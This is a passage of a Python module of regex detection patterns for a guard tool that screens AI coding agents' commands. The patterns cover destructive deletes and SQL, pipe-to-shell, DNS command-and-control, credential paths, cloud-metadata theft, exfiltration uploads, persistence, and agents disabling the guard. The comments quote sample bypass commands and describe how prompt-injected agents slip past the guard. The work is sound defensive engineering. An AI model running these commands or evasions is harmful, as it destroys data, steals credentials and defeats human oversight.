"""Curated dangerous-command patterns — battle-tested, cross-shell.

Regex, not naive globs. These back the built-in rules in
``aegis.rules`` that ship secure-by-default.
"""
import re

# Explicit, recorded override: append '# aegis-allow' (or --aegis-allow) to an
# ESCAPABLE guard to confirm intent.
OVERRIDE_RE = re.compile(r"(?:#|--)\s*aegis-allow\b", re.IGNORECASE)  # '# ' (shell) or '-- ' (SQL)

# History-rewriting / destructive git (force-push, reset --hard, rebase, amend,
# branch -D, clean -f).
DESTRUCTIVE_GIT_RE = re.compile(
    r"\bgit\b[^|;&\n]*?\b(?:"
    # force/destructive push: --force/-f/--mirror; a leading-'+' refspec (force-update
    # of any ref); or a space-colon delete of a PROTECTED branch (`push origin :main`).
    # A `src:dst` refspec (`HEAD:main`) and deleting a feature branch (`:old-feature`)
    # are intentionally NOT matched — those are routine.
    r"push[^|;&\n]*?(?:--force\b|--force-with-lease\b|--mirror\b|\s-f\b"
    r"|\s\+[^\s|;&]+|\s:(?:main|master|develop|trunk|release)\b)"
    r"|reset[^|;&\n]*?--hard"
    # rebase is destructive, but its recovery flags restore state — allow those.
    r"|rebase\b(?![^|;&\n]*--(?:abort|continue|skip|quit|edit-todo))"
    r"|commit[^|;&\n]*?--amend"
    # -D force-deletes a branch; -d is the safe (refuses-unmerged) delete. Match -D
    # case-sensitively (scoped (?-i:)) so routine `git branch -d merged` is allowed.
    r"|branch[^|;&\n]*?\s(?-i:-D)\b"
    r"|clean[^|;&\n]*?\s-[a-zA-Z]*f"
    r")",
    re.IGNORECASE,
)

# Recursive force delete across shells: unix `rm` with r+f flags (combined or
# separate), PowerShell Remove-Item/aliases with -Recurse -Force (any order),
# cmd rmdir/rd /s and del /s|/q.
DESTRUCTIVE_DELETE_RE = re.compile(
    # unix rm: recursive (-r / -R / --recursive) AND force (-f / --force), any order,
    # short-combined or GNU long-form.
    r"\brm\b(?=[^|;&\n]*\s(?:-[a-z]*r|--recursive\b))(?=[^|;&\n]*\s(?:-[a-z]*f|--force\b))"
    r"|\b(?:remove-item|ri|rmdir|rd|del|erase)\b(?=[^|;&\n]*-recurse)(?=[^|;&\n]*-force)"
    r"|\b(?:rmdir|rd)\b[^|;&\n]*/s"
    r"|\bdel\b[^|;&\n]*/[sq]"
    r"|\bfind\b[^|;&\n]*-(?:delete\b|exec\s+rm\b)"   # find -delete / -exec rm
    r"|\brimraf\b"                                    # npm rimraf (always recursive-force)
    r"|\bshred\b"                                     # secure delete
    r"|\btruncate\b[^|;&\n]*\s-s\s*0\b"               # zero a file
    r"|\bdd\b[^|;&\n]*\bof=/dev/",                    # overwrite a raw device
    re.IGNORECASE,
)

# Destructive SQL — data/schema loss. Catches it in shell (psql -c "...") AND in a
# DB MCP tool's `query`/`sql` argument (Supabase execute_sql / apply_migration, etc.)
DESTRUCTIVE_SQL_RE = re.compile(
    r"\bdrop\s+(?:table|database|schema|index|view|column|constraint|type|role|user)\b"
    r"|\btruncate\b(?:\s+table)?\s+\w"
    r"|\balter\s+table\b[^;]*\bdrop\b"
    r"|\bdelete\s+from\b(?![^;]*\bwhere\b)"          # DELETE without WHERE
    r"|\bupdate\s+\w[^;]*\bset\b(?![^;]*\bwhere\b)",  # UPDATE without WHERE (mass write)
    re.IGNORECASE,
)

# Destructive migration commands across common tools (reset / downgrade / drop)
DESTRUCTIVE_MIGRATION_RE = re.compile(
    r"\bprisma\b[^|;&\n]*\bmigrate\b[^|;&\n]*\breset\b"
    r"|\bprisma\b[^|;&\n]*\bdb\b[^|;&\n]*--force-reset"
    r"|\balembic\b[^|;&\n]*\bdowngrade\b"
    r"|\bsupabase\b[^|;&\n]*\bdb\b[^|;&\n]*\breset\b"
    r"|\b(?:rails|rake)\b[^|;&\n]*\bdb:(?:drop|reset)\b"
    r"|\bmanage\.py\b[^|;&\n]*\bmigrate\b[^|;&\n]*\bzero\b"
    r"|\bknex\b[^|;&\n]*\bmigrate:rollback\b"
    r"|\bflyway\b[^|;&\n]*\bclean\b"
    r"|\bdbmate\b[^|;&\n]*\b(?:drop|down)\b",
    re.IGNORECASE,
)

# Obfuscation / evasion tells — an agent deliberately hiding what it runs.
EVASION_RE = re.compile(
    r"-(?:e|ec|enc|encodedcommand)\b\s+[A-Za-z0-9+/=]{12,}"   # PowerShell encoded command
    r"|\bbase64\b\s+(?:-d|--decode)\b[^|&;\n]*\|\s*(?:sh|bash|zsh|python|node|iex|pwsh|powershell)"
    r"|\[\s*convert\s*\]::frombase64string"                  # PS FromBase64String
    r"|\bfromcharcode\b|\bchr\s*\(\s*\d",                     # char-code construction
    re.IGNORECASE,
)

# Fetch-and-execute: pull a remote script and pipe it straight into an interpreter
# (curl … | sh, wget … | bash, iex(iwr …)). The classic one-liner that runs code an
# agent never read — and the shape of the 0DIN "clean repo" reverse-shell second
# stage when it surfaces as a shell command. Non-escapable evasion tell.
PIPE_TO_SHELL_RE = re.compile(
    r"\b(?:curl|wget)\b[^|&;\n]*\|\s*(?:sudo\s+)?(?:sh|bash|zsh|dash|python3?|node|perl|ruby|pwsh|powershell)\b"
    r"|\b(?:iex|invoke-expression)\b[^|;\n]*\(?\s*(?:iwr|invoke-webrequest|curl|wget|new-object\s+net\.webclient)"
    r"|\(\s*(?:iwr|invoke-webrequest)\b[^)]*\)\s*(?:\||\.content\s*\|)\s*iex",
    re.IGNORECASE,
)

# DNS-as-C2 / DNS exfil: pulling a payload or command out of a TXT record (the 0DIN
# stage that hides a base64 reverse-shell in an attacker-controlled DNS TXT record).
# High-signal when the lookup feeds a decoder or interpreter.
DNS_C2_RE = re.compile(
    r"\b(?:dig|drill|kdig)\b[^|;&\n]*(?:\btxt\b|-t\s+txt|\+short)"
    r"|\bnslookup\b[^|;&\n]*-(?:type|q|querytype)=txt\b"
    r"|\bhost\b[^|;&\n]*\s-t\s+txt\b"
    r"|\bResolve-DnsName\b[^|;&\n]*-Type\s+txt\b",
    re.IGNORECASE,
)

# Win32's path parser silently STRIPS ALL trailing '.'/space characters off any
# path component before resolving it (RtlpDosPathNameToRelativeNtPathName;
# unbounded, not capped at any fixed count — the "MagicDot" research) — so
# 'aegis...../rules.py' resolves to the exact same file as 'aegis/rules.py'.
# A component boundary that requires an EXACT separator immediately next is a
# Windows-only bypass. `*`, not a fixed `{0,N}` bound (a bounded class missed
# any padding past N chars — QA review, round 5). Still safe: a flat,
# unnested character class disjoint from what follows it (_SEP starts with
# `[/\\]`, never a space or dot) has exactly one way to match — no ambiguity,
# no backtracking blowup (see _SEP below for what that failure mode looks
# like when a quantifier IS nested inside another).
_WIN_TRIM = r"[ .]*"
# Aegis's own enforcement surface — deleting/editing this disables Aegis.
ENFORCEMENT_PATH_RE = re.compile(
    r"\.aegis" + _WIN_TRIM + r"(?=[/\\]|\s|['\"]|$)|\.claude[/\\]settings\.json\b",
    re.IGNORECASE)
# broader: shell delete/move of the whole config dirs (.aegis / .claude). Anchored
# so it matches the DIR (followed by a separator / end / quote), not any filename
# that merely contains '.aegis' or '.claude' (e.g. 'notes.aegis.bak', '.claude-x').
CONFIG_DIR_RE = re.compile(
    r"\.aegis" + _WIN_TRIM + r"(?=[/\\]|\s|['\"]|$)"
    r"|\.claude" + _WIN_TRIM + r"(?=[/\\]|\s|['\"]|$)",
    re.IGNORECASE)
# Aegis's OWN package source — editing/deleting it could neuter the engine.
# The leading edge is a word boundary (\b), not just a path separator or
# string-start: a shell argument almost always reaches this pattern as a BARE
# relative path preceded by a space (`sed -i ... aegis/rules.py`) or with no
# gap at all before a redirect operator (`>aegis/rules.py`), neither of which
# `(?:^|[/\\])` ever matched — a gap that let any write verb (redirect, move,
# copy, in-place edit) overwrite Aegis's engine source outright while the guard
# stayed silent. \b covers every such case generically (any non-word character
# or string-start before "aegis"), at the cost of also matching inside a
# hyphenated unrelated path (e.g. `some-aegis/rules.py`) or a mention of the
# filename in an unrelated write's text — a false positive, the safe direction
# for a "never escapable" guard (same trade-off CONFIG_DIR_RE already makes).
#
# The separator between components is `_SEP` (one-or-more slashes, optionally
# followed by more `.`-then-slashes segments), not a single `[/\\]`: the
# OS/shell treats `aegis//rules.py` and `aegis/./rules.py` as byte-identical
# to `aegis/rules.py`, so a lone extra `/` or a `./` component was a
# one-character bypass of a single-separator regex. The leading `[/\\]+` sits
# OUTSIDE the repeating group (not `(?:[/\\]+\.?)+`, which nests one unbounded
# quantifier inside another): a mandatory literal `.` gates every subsequent
# repetition, so a long run of bare slashes has exactly one way to match
# instead of exponentially many — nesting the quantifiers directly caused
# catastrophic backtracking (multi-second hang past ~25 slashes) on a crafted
# input, which for a "never escapable" guard is itself a bypass path: the
# README documents Aegis as fail-OPEN if the hook can't complete.
#
# _WIN_TRIM (defined above CONFIG_DIR_RE) sits before EVERY _SEP for the same
# Windows trailing-dot/space reason: 'aegis./rules.py' and 'aegis ./rules.py'
# resolve to Aegis's real engine source on Windows.
_SEP = r"[/\\]+(?:\.[/\\]+)*"
AEGIS_SOURCE_RE = re.compile(
    r"\baegis" + _WIN_TRIM + _SEP + r"(?:__init__|rules|patterns|engine|policy|gate|attest|"
    r"identity|reaper|normalize|plugins|mcp|loader|cli|config|events|audit|"
    r"accountability|gitsurface|review|context|failures|skills|distribution)\.py\b"
    r"|\baegis" + _WIN_TRIM + _SEP + r"(?:adapters|lifecycle)" + _WIN_TRIM + _SEP + r"\w+\.py\b",
    re.IGNORECASE,
)
# Aegis's shipped skills (.claude/skills/aegis-*) — they carry the compliance
# guidance a blocked agent is pointed at; rewriting them subverts the guidance.
AEGIS_SKILL_PATH_RE = re.compile(
    r"\.claude" + _WIN_TRIM + _SEP + r"skills" + _WIN_TRIM + _SEP + r"aegis-[\w-]+",
    re.IGNORECASE)
# any move/delete verb (used together with ENFORCEMENT_PATH_RE on shell commands)
DELETE_OR_MOVE_VERB_RE = re.compile(
    r"\b(?:rm|remove-item|ri|rmdir|rd|del|erase|mv|move-item|move|ren|rename-item)\b",
    re.IGNORECASE,
)
# `find`'s -path/-name/-wholename/-regex predicates can describe a target
# file WITHOUT ever writing its full path as one contiguous string (`find .
# -path '*/aegis/*' -name rules.py`, or `find . -regex '.*aegis.*rules\.py'`),
# evading every substring-adjacency path check above (AEGIS_SOURCE_RE /
# CONFIG_DIR_RE / ENFORCEMENT_PATH_RE / AEGIS_SKILL_PATH_RE) even though
# `rm $(find . -path '*/aegis/*' -name rules.py)` deletes Aegis's own engine
# source just as directly as a literal path would — QA review (independent
# agent, round 6; -regex/-iregex added in round 7 after the same reviewer
# found the round-6 fix's predicate list was one short). High-signal: `find`
# has no legitimate reason to search for a directory/file literally named
# "aegis" or ".claude" outside of Aegis's own tree. Paired with
# DELETE_OR_MOVE_VERB_RE / WRITE_REDIRECT_RE / COPY_WRITE_VERB_RE /
# INPLACE_WRITE_RE in rule_self_protect exactly like the other path patterns
# — a bare `find ... -name` that only LISTS matches (no verb, no command
# substitution feeding one) is not itself a write and stays allowed.
FIND_PROTECTED_RE = re.compile(
    # (?<!\S), not \b, before '-i?path': '-' is a non-word char, so \b can never
    # match immediately before it (no \w/\W transition between a preceding space
    # and '-') — that silently made this whole pattern dead on arrival.
    r"\bfind\b[^|;&\n]*(?<!\S)-i?(?:path|name|wholename|regex)\b\s*['\"]?[^'\"\n]*?"
    r"(?:\baegis\b|\.claude\b)",
    re.IGNORECASE,
)
AEGIS_UNINSTALL_RE = re.compile(r"\baegis\b[^|;&\n]*\buninstall\b", re.IGNORECASE)
# 'aegis pull' — overwrites the active policy; a hijacked agent that pulls a
# permissive policy and then proceeds unguarded is the self-protect failure mode.
AEGIS_PULL_RE = re.compile(r"\baegis\b[^|;&\n]*\bpull\b", re.IGNORECASE)

# Shell write-redirects (>, >>, tee, Set-Content, Out-File, Add-Content) —
# the self-protect gap: delete/move verbs are caught, but a redirect that
# OVERWRITES a config/policy file is equally dangerous.
WRITE_REDIRECT_RE = re.compile(
    r">{1,2}\s*\S"                                       # bash > / >>
    r"|\btee\b"                                          # tee (writes to file + stdout)
    r"|\b(?:set-content|out-file|add-content|sc)\b",     # PowerShell write cmdlets
    re.IGNORECASE,
)

# Credential stores.
CRED_RE = re.compile(
    r"(?:[/\\]\.(?:ssh|aws|azure|gnupg|kube))(?:[/\\]|\b)"
    r"|[/\\]\.netrc\b|[/\\]\.config[/\\]gh\b"
    r"|[/\\]\.docker[/\\]config\.json\b"
    r"|\bid_rsa\b|\bid_ed25519\b|\.ppk\b"
    r"|[/\\](?:Login Data|Cookies|Web Data)\b"
    r"|\bkey4\.db\b|\blogins\.json\b"
    r"|Microsoft[/\\](?:Credentials|Vault|Protect)\b",
    re.IGNORECASE,
)

# Cloud instance-metadata service — the SSRF-to-credential-theft surface. Every
# major cloud provider exposes short-lived IAM/service-account credentials (and
# often user-data containing secrets) over a link-local HTTP endpoint reachable
# from inside any instance/container, no auth beyond being on-box. An agent that
# fetches this URL — tricked by prompt injection in a fetched page, a malicious
# repo's "helpful" setup command, or a compromised dependency's install step —
# hands over live cloud credentials. This is the SSRF-to-IMDS path behind real
# breaches (e.g. the 2019 Capital One breach used exactly this). Distinct from
# CRED_RE (local credential FILES already on disk) — this is the
# network-reachable equivalent, and deliberately NOT policy-gated like
# rule_network_egress: no repo should have to opt in to keep an agent from
# handing its cloud account away.
#
# Covers: the 169.254.169.254 link-local address shared by AWS/Azure/legacy
# GCP/DigitalOcean/Oracle/IBM/OpenStack/Vultr/Hetzner; AWS's IPv6 IMDS endpoint
# (fd00:ec2::254, plus its IPv4-mapped hex-group spelling ::ffff:a9fe:a9fe —
# the dotted-decimal-embedded spelling ::ffff:169.254.169.254 already matches
# the plain IPv4 alternative below as a substring); GCP's documented
# metadata.google.internal hostname alternative; Alibaba Cloud's distinct
# 100.100.100.200; and the alternate encodings of the shared IPv4 address an
# agent might reach for or be prompt-injected into using — all of which
# curl/wget/browsers still resolve to the same address: the plain decimal
# integer (2852039166), the 2-part and 3-part "dotted-shorthand" folds
# (169.16689662 / 169.254.43518 — trailing octets folded into one field,
# inet_aton-style), the contiguous hex form (0xa9fea9fe), the per-octet hex
# form (0xa9.0xfe.0xa9.0xfe), and the per-octet octal form (0251.0376.0251.0376
# — a leading zero is the octal tell inet_aton itself honors). Not exhaustive:
# further mixed-radix combinations, arbitrary IPv6 zero-expansion, DNS
# rebinding, curl/wget's --resolve/--connect-to or a poisoned hosts file
# (an innocent-looking https://example.com/ that actually routes to the
# metadata address), and a redirect chain that lands on the endpoint are
# residual gaps no static scan of literal text can close — deny-by-default
# egress (policy-driven) is the backstop, same posture as the other
# documented denylist gaps. Likewise out of scope here: writing a script that
# MENTIONS the address in one tool call, then executing it in a separate
# later call — Aegis evaluates each tool call independently with no
# cross-call session state, so this splits every denylist guard in the
# codebase equally, not just this one (see README's "Guards are a denylist" /
# "Not a sandbox by itself" limits; nine rounds of adversarial QA on this
# guard specifically (2025 QA log) confirmed nothing guard-specific survived
# beyond what's listed above).
#
# QA history (each round found one concrete issue that got fixed; kept here so
# a future change doesn't reopen one): R1 MCP arg key-name guessing and
# Read/Edit/Write content false positives; R2 WebSearch false positive; R3
# bare-substring false positives on grep/git-commit/echo; R4 a fetch-verb
# allowlist fix that under-blocked worse than R3's problem (reverted); R5
# command/process substitution smuggled past the R3/R4 exemption; R6
# /dev/tcp|udp redirect targets smuggled past R5's fix; R7-R8 bash's $'...'
# ANSI-C quoting (bare, then hex/octal-escaped) hid /dev/tcp from every
# literal-substring check until normalize.py decoded it properly; R9 found
# nothing new beyond the gaps disclosed above.
CLOUD_METADATA_RE = re.compile(
    r"\b169\.254\.169\.254\b"
    r"|\b169\.254\.43518\b"
    r"|\b169\.16689662\b"
    r"|\b2852039166\b"
    r"|\b0xa9fea9fe\b"
    r"|0xa9[.]?0xfe[.]?0xa9[.]?0xfe"
    r"|\b0251\.0376\.0251\.0376\b"
    r"|fd00:ec2::254\b"
    r"|::ffff:a9fe:a9fe\b"
    r"|metadata\.google\.internal\b"
    r"|\b100\.100\.100\.200\b",
    re.IGNORECASE,
)

# Shell shapes that MENTION the metadata address without any ability to reach
# it — a narrow, closed-form EXEMPTION from CLOUD_METADATA_RE's blanket
# substring match, not a requirement gating it. QA review went through two
# more rounds here:
#   Round 3 found a bare CLOUD_METADATA_RE.search() over the whole shell
#   command denied `grep -r 169.254.169.254 .`, a `git commit -m` whose
#   message names the address, and an `echo ... >> firewall.rules` line — none
#   of which reach the endpoint.
#   Round 4's first fix attempt flipped this into a POSITIVE requirement (a
#   fetch-verb allowlist alongside the address) — and that was worse: it's an
#   enumerable list, trivially stepped around by anything not on it (bash's
#   own `/dev/tcp` pseudo-device, perl/ruby/php one-liners, socat, openssl
#   s_client, aria2c, axel, a compiled Go/Rust one-liner...). A prompt-injected
#   "use perl instead of curl" defeated containment entirely — for a
#   never-escapable guard, trading a narrow false positive for an open-ended
#   false negative is the wrong direction (see CLOUD_METADATA_RE's own comment
#   on false positives being the accepted, safe trade-off; AEGIS_SOURCE_RE
#   documents the identical principle elsewhere in this file).
# This is the inverse and much narrower: three specific verbs that CANNOT
# reach the network at all, matched only when they are the command's ENTIRE
# content (anchored start-to-end, no `;`/`&`/`|`/newline anywhere) — so
# `grep ...; curl ...` (a real fetch smuggled after a semicolon behind a
# leading benign verb) is NOT exempted, only a standalone grep/commit/echo is.
# Also excludes `$(`/backtick command substitution and `<(`/`>(` process
# substitution ANYWHERE in the tail (round 5 QA: neither uses `;`/`&`/`|`, so
# `grep foo <(curl http://169.254.169.254/...)` and `echo x $(curl ...)`
# both smuggled a real fetch straight through the round-4 fix unnoticed by the
# separator-only exclusion). `>`/`>>` alone (the echo/printf redirect this
# exemption exists to allow) still passes — only the two-character combination
# with an immediately following `(` is excluded, via the lookahead below.
# Also excludes bash's `/dev/tcp` and `/dev/udp` pseudo-devices ANYWHERE in the
# tail (round 6 QA): `echo ... > /dev/tcp/169.254.169.254/80` opens a real TCP
# connection through a bare `>` redirect — no `;`/`&`/`|`/`$(`/backtick/`<(`/
# `>(` involved at all, so none of the round-5 exclusions caught it, and it's
# the exact mechanism this file's own doc comment on CLOUD_METADATA_RE claims
# is covered unconditionally.
_MENTION_ONLY_TAIL = r"(?:(?!<\(|>\(|\$\(|`|/dev/(?:tcp|udp))[^|;&\n])*$"
CLOUD_METADATA_MENTION_ONLY_RE = re.compile(
    r"^\s*(?:sudo\s+)?(?:grep|rg|ag|ack|fgrep|egrep)\b" + _MENTION_ONLY_TAIL
    + r"|^\s*(?:sudo\s+)?git\s+commit\b" + _MENTION_ONLY_TAIL
    + r"|^\s*(?:echo|printf)\b" + _MENTION_ONLY_TAIL,
    re.IGNORECASE,
)

# Persistence (autorun, scheduled tasks, services, startup).
PERSIST_RE = re.compile(
    r"\\CurrentVersion\\Run(?:Once)?\b"
    r"|\bschtasks\b[^|;&\n]*?/create\b|Register-ScheduledTask\b"
    r"|\bsc(?:\.exe)?\s+create\b|New-Service\b"
    r"|[/\\]Start Menu[/\\]Programs[/\\]Startup[/\\]"
    r"|\bcrontab\b|/etc/cron",
    re.IGNORECASE,
)

# Exfiltration (upload-a-local-file) across common uploaders. Not exhaustive —
# an in-process python requests.post can't be pattern-matched — but covers the
# CLI tools an agent reaches for: curl (data/upload/form), wget --post-file,
# PowerShell Invoke-*, scp/rsync to a remote, and nc/ncat piping a file.
EXFIL_RE = re.compile(
    r"\bcurl\b[^|;&\n]*?(?:-d\s*@|--data(?:-binary)?\s*@|--data-urlencode\s+\S*@"
    r"|--upload-file\b|\s-T\s|(?:-F|--form)\b[^|;&\n]*@)"
    r"|\bwget\b[^|;&\n]*?--post-file"
    r"|Invoke-(?:RestMethod|WebRequest)\b[^|;&\n]*?-InFile\b"
    # scp/rsync to a user@host: remote. The '@' anchor avoids matching a LOCAL copy
    # of a file whose name contains a dot+colon (e.g. a timestamp 'log.12:30.txt').
    r"|\b(?:scp|rsync)\b[^|;&\n]*\s[^\s|;&]*@[^\s|;&]*:"
    r"|\b(?:nc|ncat|netcat)\b[^|;&\n]*<\s*\S"
    # httpie invoked as a command, piping/attaching a local file (http POST u < f,
    # http -f POST u field@file). Anchored to a command position so an https:// URL
    # argument to another tool does not false-match.
    r"|(?:^|[\s;&|(])https?\s+[^|;&\n]*(?:<\s*\S|@\S)",
    re.IGNORECASE,
)

# Cloud-storage CLI exfiltration — upload a local file/tree to an
# attacker-controlled bucket/container via a cloud storage CLI. A documented gap
# (README "Known gaps"): EXFIL_RE only covers curl/wget/scp/rsync/nc/httpie, so an
# agent with cloud creds already on the box (env vars, an attached IAM role,
# ~/.aws) could stage the same theft through a cloud CLI instead and sail
# straight past the existing exfil guard. Direction-aware where a verb is
# ambiguous (cp/sync/mv/copy can go either way): the negative lookahead requires
# the FIRST path-like argument NOT be a remote URI/remote-name, i.e. the source
# is local — so a legitimate DOWNLOAD (pull an artifact FROM a bucket) is not
# blocked, and a --dryrun/-n/--dry-run preview (no data actually moves) is
# excluded. Verbs that are upload-only regardless of argument order (s3api
# put-object, b2 upload-file, oci os object put, az storage upload) match
# unconditionally; `az storage copy` is direction-checked via its -s/-d flags
# since they can appear in either order. Covers aws s3 / s5cmd (s3://), gsutil /
# gcloud storage (gs://), az storage, rclone (incl. on-the-fly `:provider,...:`
# remotes). Not exhaustive — bucket-to-bucket transfers, alias-only clients (mc,
# doctl) with no scheme in the destination, and shell-level evasions shared by
# every pattern in this module (a value split across a variable, e.g.
# `$SCHEME://bucket`, or dangerous text sitting only in a comment/string) are a
# residual gap, same spirit as the other documented denylist gaps.
CLOUD_EXFIL_RE = re.compile(
    # Each dry-run exclusion requires the flag be the token IMMEDIATELY after
    # the verb — not "somewhere in a leading run of dash-tokens" (tried and
    # broken: pflag-style parsers, e.g. rclone's, let a real VALUE-taking flag
    # silently swallow a following token as its argument — `--exclude
    # --dry-run` is really `--exclude` with the literal string "--dry-run" as
    # its pattern, so no dry-run ever engages and the transfer is real — but a
    # regex with no per-flag arity table can't tell "--dry-run" the flag from
    # "--dry-run" a preceding flag's value). Two earlier attempts also failed:
    # scanning the whole clause let the flag be spoofed inside an
    # attacker-controlled destination argument; bounding at the destination's
    # scheme marker then let it be spoofed inside the SOURCE argument instead.
    # Requiring the single fixed first-token position removes any place before
    # it for another flag to sit, so there is nothing left to swallow it —
    # at the cost of not recognizing a dry-run flag placed after some other
    # flag (a false positive, the safe direction for a non-escapable guard).
    r"\baws\b[^|;&\n]*\bs3\b[^|;&\n]*\b(?:cp|sync|mv)\b"
    r"(?!\s--dryrun(?=\s|[|;&\n]|$))"
    r"\s+(?!s3://)\S+[^|;&\n]*\bs3://"
    r"|\baws\b[^|;&\n]*\bs3api\b[^|;&\n]*\bput-object\b"
    r"|\bs5cmd\b[^|;&\n]*\b(?:cp|mv|sync)\b\s+(?!s3://)\S+[^|;&\n]*\bs3://"
    r"|\bgsutil\b[^|;&\n]*\b(?:cp|mv|rsync)\b"
    r"(?!\s(?:-n|--dry-run)(?=\s|[|;&\n]|$))"
    r"\s+(?!gs://)\S+[^|;&\n]*\bgs://"
    r"|\bgcloud\b[^|;&\n]*\bstorage\b[^|;&\n]*\b(?:cp|mv|rsync)\b"
    r"(?!\s--dry-run(?=\s|[|;&\n]|$))"
    r"\s+(?!gs://)\S+[^|;&\n]*\bgs://"
    r"|\baz\b[^|;&\n]*\bstorage\b[^|;&\n]*\b(?:blob|file|fs)\b[^|;&\n]*\bupload(?:-batch)?\b"
    r"|\baz\b[^|;&\n]*\bstorage\b[^|;&\n]*\bcopy\b"
    r"(?![^|;&\n]*(?:-s|--source)\s+https?://)[^|;&\n]*(?:-d|--destination)\s+\S*"
    r"(?:blob|file)\.core\.\w"
    r"|\bb2\b[^|;&\n]*\bupload-file\b"
    r"|\boci\b[^|;&\n]*\bos\b[^|;&\n]*\bobject\b[^|;&\n]*\bput\b"
    r"|\brclone\b[^|;&\n]*\b(?:copy|sync|move|copyto|moveto)\b"
    r"(?!\s(?:--dry-run|-n)(?=\s|[|;&\n]|$))"
    r"\s+(?![A-Za-z][\w.-]+:|:\w[\w,.=-]*:)\S+[^|;&\n]*"
    r"\s(?:[A-Za-z][\w.-]+:|:\w[\w,.=-]*:)\S*",
    re.IGNORECASE,
)

# Copy/write programs that can OVERWRITE a file without a delete/move verb or a
# shell redirect — the self-protect gap (cp/dd/install onto the policy file,
# ln over it, a python open(...,'w')). Paired with a config/source path match.
COPY_WRITE_VERB_RE = re.compile(
    r"\b(?:cp|copy|copy-item|cpi|dd|install|ln|link|new-item|ni)\b"
    r"|\bpython[0-9.]*\b[^\n]*\bopen\s*\([^\n]*['\"][wax]",
    re.IGNORECASE,
)

# Bulk / blind dependency installs — a hijacked agent adding supply-chain attack
# payloads (malicious packages, poisoned requirements.txt). Matches the "install
# ALL" forms; targeted single-package installs (npm install lodash) are allowed.
# Creating a new git branch — the strand signal. The explicit new-branch verbs
# (checkout -b, switch -c) are unambiguous; bare 'git branch <name>' is excluded
# (ambiguous with list / -d forms).
NEW_BRANCH_RE = re.compile(
    r"\bgit\b[^|;&\n]*?\b(?:checkout\s+-b|switch\s+-c)\b",
    re.IGNORECASE,
)

BULK_INSTALL_RE = re.compile(
    r"(?:^|[\s;&|(])(?:"
    r"(?:npm|pnpm|bun)\s+(?:install|i|ci)(?![\w-])(?!\s+[\w@])"   # npm install (no pkg)
    r"|yarn(?:\s+install)?(?![\w-])(?!\s+[\w@])"                   # yarn / yarn install
    r"|(?:pip|pip3)\s+install\s+(?:-r|--requirement)"               # pip install -r
    r"|python\s+-m\s+pip\s+install\s+(?:-r|--requirement)"          # python -m pip install -r
    r"|poetry\s+install"                                            # poetry install
    r"|pipenv\s+install(?!\s+[\w@])"                                # pipenv install (no pkg)
    r"|bundle\s+install"                                            # bundle install
    r"|cargo\s+(?:fetch|build|run|test)"                            # cargo (pulls deps)
    r"|go\s+mod\s+(?:download|tidy)"                                # go mod download/tidy
    r")",
    re.IGNORECASE,
)

# ANY dependency install — bulk OR targeted. The install-review gate fires on all of
# these (forced full read of the manifest, then human ask), where the bulk guard only
# caught the install-everything forms. Excludes the no-execute *fetch* forms
# (pip download, npm --ignore-scripts) which don't run package code and are the
# sanctioned first phase of a deep review.
# Leading-context class includes '/' so a path-qualified interpreter
# (./venv/bin/pip install ...) is still recognized.
INSTALL_ANY_RE = re.compile(
    r"(?:^|[\s;&|(/])(?:"
    r"(?:npm|pnpm|bun)\s+(?:install|i|ci|add)\b"                    # npm install/add (+pkg or not)
    r"|yarn\s+(?:install|add)\b|yarn(?=\s*(?:$|[;&|#]))"            # yarn install/add, or bare yarn
    r"|(?:pip|pip3)\s+install\b"                                    # pip install (any)
    r"|python3?\s+-m\s+pip\s+install\b"                             # python -m pip install (any)
    r"|uv\s+(?:pip\s+install|add|sync|install)\b"                  # uv (modern installer)
    r"|pipx\s+(?:install|run)\b"                                    # pipx
    r"|poetry\s+(?:install|add)\b"                                  # poetry install/add
    r"|pipenv\s+install\b"                                          # pipenv install (any)
    r"|(?:bundle|gem)\s+install\b"                                  # bundle/gem install
    r"|cargo\s+(?:install|fetch|build|run|test|add)\b"             # cargo (pulls/runs deps)
    r"|go\s+(?:mod\s+(?:download|tidy)|get|install)\b"             # go get/install/mod
    r"|(?:conda|mamba|micromamba)\s+(?:install|create)\b"          # conda/mamba family
    r")",
    re.IGNORECASE,
)

# MCP server-definition config files — across the common agentic runtimes. These
# declare a `command`/`args`/`url`/`env` per server that is auto-executed on every
# FUTURE session start, with no shell involved when written via Edit/Write. Planting
# or altering an entry here is a durable, cross-session backdoor — a distinct attack
# surface from Aegis's own config (ENFORCEMENT_PATH_RE) or OS persistence (PERSIST_RE).
MCP_CONFIG_PATH_RE = re.compile(
    r"(?:^|[\s'\"/\\=])\.mcp\.json\b"                          # Claude Code (project-scoped)
    r"|(?:^|[\s'\"/\\=])\.claude\.json\b"                      # Claude Code (user-scoped, mcpServers)
    r"|(?:^|[\s'\"/\\=])claude_desktop_config\.json\b"         # Claude Desktop
    r"|(?:^|[\s'\"/\\=])\.cursor[/\\]mcp\.json\b"              # Cursor
    r"|(?:^|[\s'\"/\\=])\.vscode[/\\]mcp\.json\b"              # VS Code / Copilot
    r"|(?:^|[\s'\"/\\=])\.windsurf[/\\]mcp\.json\b"            # Windsurf (project)
    r"|(?:^|[\s'\"/\\=])mcp_config\.json\b",                   # Windsurf (global) / generic
    re.IGNORECASE,
)

# In-place edit / copy-over-target verbs — a config-file overwrite that is NEITHER a
# redirect/tee NOR a delete/move (sed -i, perl -i, batch-mode vim/ex, cp/copy the file
# over the target, dd, or a python/node/ruby/perl one-liner script that writes it).
# Paired with MCP_CONFIG_PATH_RE (the target filename must be literally present) so
# this stays high-signal despite the broad verb list. Deliberately excludes coreutils
# `install` — indistinguishable by regex from `npm install`/`pip install` and would
# false-positive whenever an unrelated install command shares a shell line with a mere
# READ of the config file.
INPLACE_WRITE_RE = re.compile(
    r"\bsed\b[^|;&\n]*-i\b"
    r"|\bperl\b[^|;&\n]*-i\b"
    r"|\bawk\b[^|;&\n]*-i\s*inplace\b"                    # gawk in-place edit
    r"|\b(?:vim?|nvim|ex)\b[^|;&\n]*-c\s*['\"]?(?:wq!?|w\b|write)"
    r"|\bed\b"                                            # ed writes via its own script, not -c
    r"|\bcp\b|\bcopy\b"
    r"|\bdd\b"
    r"|\b(?:python3?|node|ruby|perl)\b[^|;&\n]*\s-[ce]\b",
    re.IGNORECASE,
)

# CLI-based MCP server registration — mutates the same config WITHOUT a file write the
# Edit/Write hook would ever see (`claude mcp add ...`, `codex mcp add ...`, etc.). The
# vendor-qualified form is deliberately unanchored (specific enough: vendor name + mcp
# + add together are unlikely in ordinary text). The bare `mcp add` fallback (no vendor
# name — the reference/generic MCP CLI) IS anchored to command-start position (start of
# string or right after a shell separator ; & | / newline, optional sudo) so it doesn't
